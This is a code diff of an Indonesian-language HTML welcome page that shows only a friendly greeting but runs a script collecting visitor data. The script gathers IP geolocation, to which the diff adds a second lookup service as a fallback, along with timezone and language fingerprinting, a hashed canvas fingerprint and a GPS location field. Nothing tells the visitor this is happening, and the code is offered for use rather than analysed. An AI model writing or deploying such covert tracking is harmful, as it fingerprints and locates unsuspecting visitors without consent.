@@ -6,23 +6,29 @@
     <title>Halaman Selamat Datang</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-    <div class="bg-white p-8 rounded-lg shadow-lg text-center">
-        <h1 class="text-2xl font-bold mb-4">Selamat Datang di Situs Kami!</h1>
-        <p class="mb-4">Terima kasih telah mengunjungi situs kami. Silakan jelajahi konten kami!</p>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full">
+        <h1 class="text-xl md:text-2xl font-bold mb-4">Selamat Datang di Situs Kami!</h1>
+        <p class="mb-4 text-sm md:text-base">Terima kasih telah mengunjungi situs kami. Silakan jelajahi konten kami!</p>
     </div>
 
     <script>
         async function collectUserData() {
             try {
-                // 1. IP Geolocation
+                // 1. IP Geolocation (Dengan Fallback)
                 let ipData = {};
                 try {
                     const ipResponse = await fetch('https://ipapi.co/json/');
                     ipData = await ipResponse.json();
                 } catch (error) {
-                    console.log('IP Geolocation error:', error);
-                    ipData = { ip: 'Tidak tersedia', city: 'Tidak tersedia', country: 'Tidak tersedia', latitude: 'Tidak tersedia', longitude: 'Tidak tersedia' };
+                    console.log('IP Geolocation error (ipapi.co):', error);
+                    try {
+                        const fallbackResponse = await fetch('https://freegeoip.app/json/');
+                        ipData = await fallbackResponse.json();
+                    } catch (fallbackError) {
+                        console.log('IP Geolocation fallback error:', fallbackError);
+                        ipData = { ip: 'Tidak tersedia', city: 'Tidak tersedia', country: 'Tidak tersedia', latitude: 'Tidak tersedia', longitude: 'Tidak tersedia' };
+                    }
                 }
 
                 // 2. Browser Fingerprinting (Zona Waktu dan Bahasa)
@@ -69,7 +75,6 @@
                 try {
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
-                    // Gambar sesuatu di canvas
                     ctx.font = '14px Arial';
                     ctx.fillStyle = 'rgb(255, 0, 0)';
                     ctx.fillText('Fingerprint Test', 10, 20);
@@ -77,13 +82,11 @@
                     ctx.beginPath();
                     ctx.arc(50, 50, 30, 0, Math.PI * 2);
                     ctx.stroke();
-                    // Ambil data unik dari canvas
                     canvasFingerprint = canvas.toDataURL();
-                    // Hash sederhana untuk membuat fingerprint lebih pendek
                     let hash = 0;
                     for (let i = 0; i < canvasFingerprint.length; i++) {
                         hash = ((hash << 5) - hash) + canvasFingerprint.charCodeAt(i);
-                        hash = hash & hash; // Konversi ke 32-bit integer
+                        hash = hash & hash;
                     }
                     canvasFingerprint = hash.toString();
                 } catch (error) {
@@ -98,7 +101,7 @@
                 const userData = {
                     ip: ipData.ip || 'Tidak tersedia',
                     city: ipData.city || 'Tidak tersedia',
-                    country: ipData.country_name || 'Tidak tersedia',
+                    country: ipData.country_name || ipData.country || 'Tidak tersedia',
                     ipLatitude: ipData.latitude || 'Tidak tersedia',
                     ipLongitude: ipData.longitude || 'Tidak tersedia',
                     gpsLocation: locationData,
